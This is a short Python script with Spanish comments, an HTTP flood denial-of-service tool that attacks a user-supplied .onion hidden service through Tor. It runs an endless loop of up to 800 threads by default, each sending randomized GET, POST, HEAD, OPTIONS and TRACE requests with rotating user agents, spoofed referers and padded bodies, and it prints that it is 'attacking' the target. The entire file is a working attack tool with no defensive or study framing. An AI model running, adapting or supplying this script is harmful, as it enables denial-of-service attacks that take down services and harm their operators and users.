#!/usr/bin/env python3
# martillazo_alpha_simple.py — versión rápida, ligera y agresiva usando solo Tor por 9050

import socks, socket, threading, random, time, argparse

parser = argparse.ArgumentParser()
parser.add_argument("onion_host", help="Dominio .onion v3")
parser.add_argument("-t", "--threads", type=int, default=800, help="Hilos máximos")
args = parser.parse_args()

onion_host = args.onion_host
max_threads = args.threads
active_threads = 0
lock = threading.Lock()

PORT = 80
SOCKS_PORT = 9050

user_agents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
    "curl/7.87.0", "Wget/1.21.1", "Lynx/2.8.9rel.1",
    "python-requests/2.31", "Go-http-client/1.1", "libwww-perl/6.66"
]
referers = [
    "http://duckduckgo.com", "http://protonmail.com",
    "http://facebookcorewwwi.onion", "http://torproject.org"
]
metodos = ["GET", "POST", "HEAD", "OPTIONS", "TRACE"]

def generar_payload():
    metodo = random.choice(metodos)
    ruta = f"/alpha/{random.randint(10000,99999)}"
    ua = random.choice(user_agents)
    ref = random.choice(referers)
    headers = (
        f"{metodo} {ruta} HTTP/1.1\r\n"
        f"Host: {onion_host}\r\n"
        f"User-Agent: {ua}\r\n"
        f"Referer: {ref}\r\n"
        f"Accept-Encoding: gzip, deflate\r\n"
        f"X-Martillazo: {random.randint(1,999999)}\r\n"
        f"Connection: keep-alive\r\n"
    )
    if metodo == "POST":
        body = f"param={random.randint(1,999999)}&data={'A'*random.randint(50,300)}"
        headers += f"Content-Length: {len(body)}\r\n\r\n{body}"
    else:
        headers += "\r\n"
    return headers

def martillazo():
    global active_threads
    try:
        s = socks.socksocket()
        s.set_proxy(socks.SOCKS5, "127.0.0.1", SOCKS_PORT)
        s.settimeout(8)
        s.connect((onion_host, PORT))
        s.setsockopt(socket.IPPROTO_IP, socket.IP_TTL, random.randint(2, 5))
        s.sendall(generar_payload().encode())
        s.close()
    except:
        pass
    with lock:
        active_threads -= 1

def lanzador():
    global active_threads
    while True:
        with lock:
            libres = max_threads - active_threads
        for _ in range(libres):
            with lock:
                active_threads += 1
            threading.Thread(target=martillazo, daemon=True).start()
        time.sleep(0.3)

if __name__ == "__main__":
    print(f"\n🔨 martillazo_alpha_simple.py atacando a {onion_host}")
    print(f"🚇 Usando solo Tor por puerto {SOCKS_PORT} | Hilos máximos: {max_threads}\n")
    lanzador()
